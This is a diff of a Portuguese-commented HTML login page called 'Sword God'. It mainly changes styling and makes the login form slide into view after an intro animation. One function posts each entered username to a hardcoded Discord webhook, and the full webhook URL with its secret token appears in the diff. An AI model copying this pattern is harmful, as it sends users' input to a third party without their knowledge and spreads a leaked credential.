@@ -6,9 +6,7 @@
     <title>Sword God - Login</title>
     <style>
         body {
-            background-image: url('https://media.discordapp.net/attachments/1288994134522331188/1294713108194918492/a_5f951d36388970cea5f5c534e6f3cb27.gif?ex=670c030b&is=670ab18b&hm=979ddbb96339a6fcdad9973247e784ce67e47919376d9a89e14d5233df003dca&=&width=440&height=247'); /* GIF como fundo */
-            background-size: cover; /* Cobre toda a tela */
-            background-position: center; /* Centraliza a imagem de fundo */
+            background-color: #000; /* Fundo preto */
             display: flex;
             justify-content: center;
             align-items: center;
@@ -16,6 +14,7 @@
             margin: 0;
             font-family: 'Arial', sans-serif;
             overflow: hidden; /* Impede rolagem durante a animação */
+            position: relative; /* Para posicionar elementos filhos */
         }
 
         .login-container {
@@ -25,6 +24,9 @@
             box-shadow: 0 0 15px rgba(255, 255, 255, 0.2);
             text-align: center;
             width: 300px; /* Largura do formulário */
+            position: absolute; /* Posiciona o formulário de login */
+            bottom: -200px; /* Começa fora da tela */
+            transition: bottom 0.5s ease; /* Transição suave ao aparecer */
             z-index: 1; /* Coloca o formulário acima da animação */
         }
 
@@ -153,6 +155,9 @@
             setTimeout(() => {
                 batAnimation.style.opacity = '0'; // Esconde a animação de morcego
                 swordGodTitle.style.opacity = '1'; // Exibe o título
+
+                // Exibir o formulário de login suavemente
+                loginContainer.style.bottom = '50%'; // Faz o formulário descer até o meio
             }, 1500); // Tempo para morcego cobrir a tela
         });
 
@@ -166,7 +171,7 @@
         });
 
         function sendUserToWebhook(username) {
-            const webhookURL = 'https://discord.com/api/webhooks/1294702699161452654/sV4vV0mtEZyB5dXl9xP2ktm2P7hWbsiGAqwgSV3Avscq0e-hcje6ek_Q9UEkd3oGgu38'; // Substitua pelo seu webhook
+            const webhookURL = 'https://discord.com/api/webhooks/1294702699161452654/sV4vV0mtEZyB5dXl9xP2ktm2P7hWbsiGAqwgSV3Avscq0e-hcje6ek_Q9UEkd3oGgu38'; // Seu webhook
 
             const payload = {
                 content: `Visita nova!\nUsuário: ${username}`,
